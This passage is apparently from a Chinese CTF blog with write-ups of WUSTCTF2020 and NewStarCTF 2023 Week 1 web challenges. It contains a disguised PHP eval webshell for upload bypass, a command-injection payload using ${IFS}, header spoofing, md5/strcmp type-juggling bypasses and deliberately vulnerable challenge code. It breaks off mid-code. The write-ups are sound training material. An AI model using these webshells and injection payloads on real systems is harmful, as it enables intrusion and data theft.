class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>sculptor-liu.github.io<span class="hljs-regexp">/2021/</span><span class="hljs-number">03</span><span class="hljs-regexp">/20/</span>GXYCTF-<span class="hljs-number">2019</span>-%E7%A6%<span class="hljs-number">81</span>%E6%AD%A2%E5%A5%<span class="hljs-number">97</span>%E5%A8%<span class="hljs-number">83</span>/<br>https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/LLeaves/</span>p/<span class="hljs-number">12868440</span>.html<br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/m0_62879498/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">124538469</span><br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/Manuffer/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">120738755</span>?spm=<span class="hljs-number">1001.2014</span>.<span class="hljs-number">3001.5506</span><br></code></pre></td></tr></table></figure><h2 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h2><p>进环境发现是这么个东西。。</p><p><img src="/img/pswh1.png" alt="pswh1"></p><p>确实和题目对应了，哈哈。他这个报错好像是个</p><p>不知道干啥就用dirsearch扫：<code>python dirsearch.py -u http://7136b55a-48c9-48ae-8945-1df4a83d47e7.node4.buuoj.cn:81/ --delay 3 -t 30</code></p><p>Kali下不用加后面那一串：<code>python dirsearch.py -u http://7136b55a-48c9-48ae-8945-1df4a83d47e7.node4.buuoj.cn:81/</code></p><p>扫出来两个东西：<code>index.php</code>和<code>robots.txt</code>，访问<code>robots.txt</code>：</p><p><img src="/img/pswh2.png" alt="pswh2"></p><p><code>index.php</code>就是进去这个界面，访问下这个<code>fAke_f1agggg.php</code>:</p><p><img src="/img/pswh3.png" alt="pswh3"></p><p>:(，burpsuite抓包看看什么情况：</p><p><img src="/img/pswh4.png" alt="pswh4"></p><p>芜湖，响应包里有这么个东西：<code>fl4g.php</code>，直接访问：</p><p><img src="/img/pswh5.png" alt="pswh5"></p><p>这里发现个问题：页面返回一堆乱码，但是放burpsuite的repeater模块里看又不存在，和上面那段<code>php</code>报错有关系？不太懂。。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br><br><br><span class="hljs-comment">//level 1</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>) &lt; <span class="hljs-number">2020</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span> + <span class="hljs-number">1</span>) &gt; <span class="hljs-number">2021</span>)&#123;<span class="hljs-comment">//num经过intval后要小于2020，加1再inntval要大于2021，直接用科学计数法绕过：2e4，即/?num=2e4</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;金钱解决不了穷人的本质问题&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;去非洲吧&quot;</span>);<br>&#125;<br><span class="hljs-comment">//level 2</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5&#x27;</span>]))&#123;<br>   <span class="hljs-variable">$md5</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5&#x27;</span>];<br>   <span class="hljs-keyword">if</span> (<span class="hljs-variable">$md5</span>==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$md5</span>))<span class="hljs-comment">//md5弱等于其md5加密后，弱等于是先将字符串类型转化成相同再比较。转换的规则为，若该字符串以合法的数值开始，则使用该值，否则其值为0。找个加密前0e开头加密后仍为0e的就行了</span><br>       <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;</span>;<br>   <span class="hljs-keyword">else</span><br>       <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;去非洲吧&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">//get flag</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;get_flag&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$get_flag</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;get_flag&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$get_flag</span>,<span class="hljs-string">&quot; &quot;</span>))&#123; <span class="hljs-comment">//get_flag中不能有空格</span><br>        <span class="hljs-variable">$get_flag</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&quot;cat&quot;</span>, <span class="hljs-string">&quot;wctf2020&quot;</span>, <span class="hljs-variable">$get_flag</span>);  <span class="hljs-comment">//str_ireplace函数不区分大小写。</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;</span>;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$get_flag</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;快到非洲了&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;去非洲吧&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br><br></code></pre></td></tr></table></figure><p>过滤了<code>cat</code>，绕过姿势太多了。。<code>ca&#39;&#39;t</code>还有<code>tac</code>啥的都可以。先<code>ls</code>看看当前目录都有啥东西：</p><p>payload:<code>?num=2e4&amp;md5=0e215962017&amp;get_flag=tac$&#123;IFS&#125;fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</code></p><p><code>flag&#123;7ff4de78-289c-405b-9361-313240dfdcec&#125;</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Writeup_2023_NewStarCTF_Week1</title>
    <link href="/2023/09/12/%5BWriteup%5D2022%20NewstarCTF_Week1(Web%E9%83%A8%E5%88%86)/"/>
    <url>/2023/09/12/%5BWriteup%5D2022%20NewstarCTF_Week1(Web%E9%83%A8%E5%88%86)/</url>
    
    <content type="html"><![CDATA[<p>NewStarCTF第一周</p><span id="more"></span><hr><h2 id="泄漏的秘密"><a href="#泄漏的秘密" class="headerlink" title="泄漏的秘密"></a>泄漏的秘密</h2><p>题目描述：粗心的网站管理员总会泄漏一些敏感信息在Web根目录下</p><p>这题一开始想用dirsearch扫的，但是嫌时间太长了就直接试了一些我知道的敏感文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">robots.txt <span class="hljs-comment">//告诉爬虫啥能爬啥不能爬，不过没啥用，这玩意儿就像防盗门一样，真想偷东西的人才不会管你上没上锁</span><br>www.zip <span class="hljs-comment">//存网站备份文件</span><br></code></pre></td></tr></table></figure><p>VIM和Git泄露没有，就这两个文件下载再打开拼一起就是flag了。</p><h2 id="Begin-of-Upload"><a href="#Begin-of-Upload" class="headerlink" title="Begin of Upload"></a>Begin of Upload</h2><p>题目描述：普通的上传啦，平平淡淡才是真</p><p><img src="/img/a9.png" alt="a9"></p><p>看看源码有啥好东西没：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>        <span class="hljs-keyword">function</span> <span class="hljs-title function_">validateForm</span>(<span class="hljs-params"></span>) &#123;<br>            <span class="hljs-keyword">var</span> fileInput = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;file&quot;</span>);<br>            <span class="hljs-keyword">var</span> file = fileInput.<span class="hljs-property">files</span>[<span class="hljs-number">0</span>];<br>            <span class="hljs-keyword">var</span> allowedExtensions = [<span class="hljs-string">&quot;jpg&quot;</span>, <span class="hljs-string">&quot;jpeg&quot;</span>, <span class="hljs-string">&quot;png&quot;</span>, <span class="hljs-string">&quot;gif&quot;</span>];<br>            <span class="hljs-keyword">var</span> fileExtension = file.<span class="hljs-property">name</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;.&#x27;</span>).<span class="hljs-title function_">pop</span>().<span class="hljs-title function_">toLowerCase</span>();<br>            <br>            <span class="hljs-keyword">if</span> (!file) &#123;<br>                <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;Please select a file to upload.&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            <br>            <span class="hljs-keyword">if</span> (!allowedExtensions.<span class="hljs-title function_">includes</span>(fileExtension)) &#123;<br>                <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;错误的拓展名，只允许上传: JPG, JPEG, PNG, GIF&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            <br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &lt;/script&gt;<br></code></pre></td></tr></table></figure><p>限制了后缀，只允许上传图片。估计是前端验证？那就上传个一句话改成图片格式，burpsuite抓个包再改回去：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs PHP">GIF89a<br><br><span class="hljs-meta">&lt;?php</span><br> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;viper&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/a10.png" alt="a10"></p><p>再改成php后缀就好了，上传路径直接显示再界面了。</p><p><img src="/img/a11.png" alt="a11"></p><p>然后直接蚁剑连，根目录底下拿flag。</p><h2 id="Begin-of-HTTP"><a href="#Begin-of-HTTP" class="headerlink" title="Begin of HTTP"></a>Begin of HTTP</h2><p>题目描述：最初的开始</p><p>md说一嘴这题最后一步限制本地用户才能访问卡了我蛮久。。因为我看到<code>只有本地用户才能访问</code>第一想到的就是改<code>X-Forwarded-For：127.0.0.1</code>和<code>Client-Ip</code>字段，但是这俩都没用。我当时人都晕了想不明白为啥不给过。(我当时思路也错了，一直在想IP地址的问题，后面还去找了<code>Authorization</code>字段的信息)。还好当时再看安恒写的那本CTF实战从入门到提升，里面有个题用的X-Real-IP字段。。。运气好把这题做出来了~</p><p><img src="/img/a12.png" alt="a12"></p><p>GET传参，?ctf&#x3D;任意就能过了。</p><p><img src="/img/a13.png" alt="a13"></p><p>POST传参，他说把secret藏起来了，看看源码里有没有啥好东西：</p><p><code>&lt;!-- Secret: base64_decode(bjN3c3Q0ckNURjIwMjNnMDAwMDBk) --&gt; //大小写数字混合，一眼base64</code></p><p>解码：<code>n3wst4rCTF2023g00000d</code></p><p><img src="/img/a14.png" alt="a14"></p><p>power是否是ctfer？burpsuite抓下包看看有没有这个字段：</p><p><img src="/img/a15.png" alt="a15"></p><p>改下cookie</p><p><img src="/img/a16.png" alt="a16"></p><p>后面就是改User-Agent头和Referer头(一个浏览器信息啥的一个网址来源)。最后他会提示只有本地用户才能通过这关，<code>X-Real-IP:127.0.0.1</code>即可。(可能我这辈子都忘不了X-Real-IP这个头了)。</p><h2 id="ErrorFlask"><a href="#ErrorFlask" class="headerlink" title="ErrorFlask"></a>ErrorFlask</h2><p>题目描述：Err……..</p><p><img src="/img/a17.png" alt="a17"></p><p>看到这题我第一想到的就是模板注入。。然后在那试49啥的，哈哈。结果直接404了。。他说给他num1和num2，我就试着get传参了<code>?number1=1</code>,结果出了这么个东西：</p><p><img src="/img/a18.png" alt="a18"></p><p>flag就藏在里面。。这个等官方wp出来了还要看一下，这题感觉没做明白。</p><h2 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of PHP"></a>Begin of PHP</h2><p>题目描述：PHP是世界上最安全的语言，真的吗？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 1=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>] !== <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$flag1</span> = True;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 1&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag1</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 2=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]))&#123;<br>            <span class="hljs-variable">$flag2</span> = True;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 2&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag2</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 3=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key4&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key4&#x27;</span>],<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag&quot;</span>)) == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-variable">$flag3</span> = True;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 3&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag3</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 4=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>] &gt; <span class="hljs-number">2023</span>)&#123;<br>            <span class="hljs-variable">$flag4</span> = True;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 4&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag4</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 5=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$var</span>)&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="hljs-variable">$var</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 5&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag5</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 5&quot;</span>);<br>    &#125;<br>&#125; <span class="hljs-comment">//一共五个绕过，都拿下后会读.flag的内容。</span><br></code></pre></td></tr></table></figure><p>先是key1key2不相等但md5加密后弱相等。这东西可以用碰撞也可以用两个东西加密后得0e开头的字符串。如果要求强相等的话直接让key1key2是两个数组就行了(无法对数组加密会返回null)。</p><p><code>?key1[]=1&amp;key2[]=2</code></p><p>第二个条件同理，其实我之前还真没碰到过这种条件(一个东西MD5加密后等于该东西SHA1加密后的值)。我当时想着既然都是hash函数那就让key3等于数组呗(强相等绕过)，结果还真绕过了。</p><p><code>strcmp</code>这东西会比较两个字符串中对应位置的ASCII大小，如果相同就继续比较下一个。<code>str1&gt;str2</code>就返回大于0，相同返回0，<code>str1&lt;str2</code>就返回小于0。</p><p><code>strcmp($_GET[&#39;key4&#39;],file_get_contents(&quot;/flag&quot;)</code>题目意思是想让我们输入的<code>key4</code>和<code>flag</code>相等，但我们根本不知道<code>flag</code>是多少。这时可以让<code>key4</code>是一个数组，<code>strcmp</code>比较的是字符串，如果传入其它类型会报错。出错会返回0，实现绕过。</p><p><code>is_numeric</code>，这个简单，直接<code>key5=2024a</code>即可。</p><p>最后一步POST传<code>key3[]=~&amp;flag5=~</code>，只要数组的值别触发正则匹配就行。</p><h2 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!C!E!"></a>R!C!E!</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$password</span>=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>    <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$password</span>,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)===<span class="hljs-string">&quot;c4d038&quot;</span>)&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|pass|cat|ls/i&quot;</span>,<span class="hljs-variable">$code</span>))&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>        &#125;<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>password经MD5加密后前六位强等于<code>&quot;c4d038&quot;</code>，这东西要写个脚本找，直接用之前做题的脚本改一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find</span>():<br>    mubiao = <span class="hljs-string">&#x27;c4d038&#x27;</span><br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        string = <span class="hljs-built_in">str</span>(i)<br>        hash_object = hashlib.md5(string.encode())<br>        <span class="hljs-keyword">if</span> hash_object.hexdigest()[:<span class="hljs-number">6</span>] == mubiao: <span class="hljs-comment">#切片操作，从零开始取六位</span><br>            <span class="hljs-keyword">return</span> string<br>        i += <span class="hljs-number">1</span><br><br>result = find()<br><span class="hljs-built_in">print</span>(result)<br><span class="hljs-comment">#结果：114514</span><br></code></pre></td></tr></table></figure><p>接下来要给<code>e_v.a.l</code>参数赋值，而且传过去的值经过正则匹配过滤后会被eval执行。<code>e_v.a.l</code>这东西很明显不满足变量名的要求：包含了小数点。看下PHP官方的解释：</p><p><img src="/img/a19.png" alt="a19"></p><p>写一小段代码体会一下咋回事：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$var</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>];<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_POST</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br/&gt;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span><span class="hljs-string">&quot;hello&quot;</span>;<br>&#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>POST传<code>e_v.a.l=&#39;hellowold!&#39;</code>：</p><p>结果：<code>array(1) &#123;  [&quot;e_v_a_l&quot;]=&gt;  string(12) &quot;&#39;hellowold!&#39;&quot; &#125;</code></p><p>可以看到POST传递的参数从<code>e_v.a.l</code>变成了<code>e_v_a_l</code>，空格同理。(但<code>e_v.a.l</code>参数仍没被赋值)。</p><p>这里 引用下mochu师傅的解释：</p><p>当<code>PHP版本小于8</code>时，如果参数中出现中括号<code>[</code>，中括号会被转换成下划线<code>_</code>，但是会出现转换错误导致接下来如果该参数名中还有<code>非法字符</code>并不会继续转换成下划线<code>_</code>，也就是说如果中括号<code>[</code>出现在前面，那么中括号<code>[</code>还是会被转换成下划线<code>_</code>，但是因为出错导致接下来的非法字符并不会被转换成下划线<code>_</code>。</p><p>还是上面那串代码，尝试<code>post</code>传参<code>e[v.a.l=&#39;hellowold!&#39;</code>.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$var</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>];<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_POST</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br/&gt;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span 